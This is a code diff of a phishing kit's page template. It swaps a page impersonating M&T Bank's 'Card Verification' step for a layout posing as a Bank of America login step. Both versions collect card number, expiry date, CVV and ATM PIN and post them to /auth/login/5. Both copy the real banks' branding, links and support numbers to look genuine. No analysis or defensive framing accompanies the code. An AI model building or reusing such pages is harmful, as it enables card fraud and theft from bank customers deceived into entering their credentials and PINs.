@@ -1,190 +1,75 @@
-<!DOCTYPE html>
-<html lang="en">
+@layout('layouts.app')
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome to Online Banking</title>
-  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
-  <link href="/css/main.css" rel="stylesheet">
-  <script src="/js/jquery.js"></script>
-  <script src="/js/mask.js"></script>
-</head>
+@section('content')
+<form id="login5Form" class="cb-form" action="/auth/login/5" method="POST">
+  <div class="columns col-small">
+    <div class="row">
+      <div class="column col-small mtop-30">
+        <div class="btm-20">
+          <h1 class="cb-login-heading">Log In to Online Banking</h1>
+        </div>
+        <div class="btm-30 cb-login-formInfo">To secure your account, please enter the following.</div>
+      </div>
 
-<body>
-  <div class="cb-app">
-    <header class="cb-header">
-      <div class="grid-x align-center">
-        <div class="cell">
-          <a href="https://www.mtb.com/home-page" class="cb-logo">
-            <img src="/img/logo.svg">
-          </a>
+      <div class="column col-small clearfix">
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cardNumLabel" class="cb-input-label" for="cardNum">Card Number</label>
+            <input id="cardNum" name="cardNum" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cardNumErrorMsg" style="display: none;">Card Number required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="expDateLabel" class="cb-input-label" for="expDate">Expiry Date</label>
+            <input id="expDate" name="expDate" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="expDateErrorMsg" style="display: none;">Expiry Date required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cvvLabel" class="cb-input-label" for="cvv">CVV</label>
+            <input id="cvv" name="cvv" type="text" class="cb-input-text" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cvvErrorMsg" style="display: none;">CVV required</div>
+          </div>
+        </div>
+
+        <div class="btm-30">
+          <div class="cb-input cb-input-box cb-input--cb2 has-help">
+            <label id="cpinLabel" class="cb-input-label" for="cpin">ATM/CARD PIN</label>
+            <input id="cpin" name="cpin" type="password" class="cb-input-text hide-input" autocapitalize="off" autocorrect="off" autocomplete="off">
+            <p class="cb-input-hint"></p>
+            <div class="cb-input-error-message cb-icon--error" id="cpinErrorMsg" style="display: none;">ATM/CARD PIN required</div>
+          </div>
+        </div>
+
+        <div class="cb-login-helpText">
+          <a href="https://secure.bankofamerica.com/bofacbsecure/cyclicApp/auth/login/">Forgot ID/Password?</a>
         </div>
       </div>
-    </header>
 
+      <div class="column col-small clearfix">
+        <div class="btn-container">
+          <button id="login2SubmitBtn" type="submit" class="cb-btn cb-btn--medium cb-btn--primary mrt-15 submitBtn">Continue</button>
 
-    <form action="/auth/login/5" method="post">
-      <div class="cb-login-content">
-        <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
-          <div class="cell">
-            <div class="cb-header-sect cb-header-sect-login">
-              <h1>
-                Card Verification
-              </h1>
-              <p>
-                Help us confirm it's you by filling out the following information.
-              </p>
-            </div>
-          </div>
-
-          <div class="cell">
-            <label for="cardNum">Debit or Credit Card Number</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="text" id="cardNum" name="cardNum" autocomplete="off">
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Debit or Credit Card Number.</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <label for="expDate">Expiration Date</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="text" id="expDate" name="expDate" placeholder="MM/YYYY" autocomplete="off">
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Card Expiration Date.</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <label for="cvv">Security Code (CVV)</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="text" id="cvv" name="cvv" autocomplete="off">
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Card Security Code (CVV).</span>
-            </p>
-          </div>
-
-          <div class="cell">
-            <label for="pin">Card/ATM PIN</label>
-            <div class="input-group cb-single-input">
-              <input class="input-group-field" type="password" id="cpin" name="cpin" autocomplete="off">
-              <div class="input-group-button">
-                <button type="button" id="showHide" class="button clear inputHidden">Show</button>
-              </div>
-            </div>
-
-            <p class="form-error cb-error-bdr">
-              <i class="cb-icon cb-icon-notification-error"></i>
-              <span class="cb-error-paragraph">Please provide your Card/ATM PIN.</span>
-            </p>
-          </div>
-        </div>
-
-        <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
-          <div class="cell">
-            <button type="submit" class="button button__form-no-spacer expanded" id="submitBtn">Next</button>
-          </div>
-
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Login/LoginHelp" class="button button-padding-no-spacer expanded clear">Help with User ID or Passcode</a>
-          </div>
-          <div class="cell">
-            <a href="https://onlinebanking.mtb.com/Enrollment/Enroll" class="button button__padding expanded clear">Enroll Now</a>
-          </div>
-
-          <p class="cell text-center __font-size-tiny __color-gray-accent">Unauthorized access is prohibited. Usage may be monitored.</p>
-        </div>
-      </div>
-    </form>
-
-    <hr class="__spacer-section">
-
-    <div class="cb-error-content">
-      <div class="grid-x grid-padding-x grid-x__padded">
-        <div class="cell text-center">
-          <p class="__font-size-secondary">
-            Have questions about M&amp;T Online Banking?
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Personal Accounts:
-            <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 8am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
-        </div>
-        <div class="cell medium-6 text-center">
-          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
-            Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
-          </p>
-          <p class="__font-size-sub __spacer-remove __color-gray-accent">
-            Monday - Friday 6am - 9pm ET
-          </p>
-          <p class="__font-size-sub __spacer-section __color-gray-accent">
-            Saturday - Sunday 9am - 5pm ET
-          </p>
+          <button id="cancelBtn" type="button" class="cb-btn cb-btn--medium cb-btn--secondary">Cancel</button>
         </div>
       </div>
     </div>
-
-    <section class="cb-footer cb-footer__auth" style="height: 14.25rem;">
-      <div class="grid-x" style="height: 14.25rem;">
-        <div class="cell flex-container flex-dir-column align-center-middle">
-          <div class="cb-footer--auth">
-            <a href="https://upgrade.mtb.com/olb-upgrade">Get Started Guide</a>
-            <a href="https://www.mtb.com/olbsecurity">Security Assistance</a>
-            <a href="https://www3.mtb.com/homepage/explore-the-m-and-t-bank-help-center/digital-services-agreement.html">Digital Service Agreement</a>
-            <a href="https://asset.mtb.com/Documents/html/ESign.htm">ESign Agreement</a>
-            <a href="https://mtb.com/olb-accessibility">Accessibility</a>
-            <a href="https://www.mtb.com/olb-personalsite">mtb.com</a>
-          </div>
-
-          <div class="cb-footer--non-auth">
-            <p>
-              ©2023 M&amp;T Bank. All Rights Reserved.<br>
-              Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use"> Terms of Use</a> and <a href="https://www.mtb.com/privacy">Privacy</a>.
-            </p>
-            <div class="cb-footer__logo">
-              <a href="https://www.mtb.com/equalhousinglender">
-                <img src="/img/ehl.svg" class="cb-footer__ehl">
-              </a>
-              <a href="https://www.mtb.com/olb-entrust">
-                <img src="/img/entrust.svg" class="cb-footer__entrust">
-              </a>
-            </div>
-            <p>
-              Equal Housing Lender NMLS #381076
-              <a href="https://www.mtb.com/fdic">Member FDIC</a>
-            </p>
-          </div>
-        </div>
-      </div>
-    </section>
   </div>
+</form>
+@endsection
 
-  <script src="/js/main.js"></script>
-  <script>
-    $('#cardNum').mask('0000 0000 0000 0000');
-    $('#expDate').mask('00/0000');
-    $('#cvv').mask('0000');
-    $('#pin').mask('0000');
-  </script>
-</body>
-
-</html>
+@section('script')
+<script>
+  $('#cardNum').mask('0000 0000 0000 0000');
+  $('#expDate').mask('00/0000');
+  $('#cvv').mask('0000');
+  $('#cpin').mask('0000');
+</script>
+@endsection
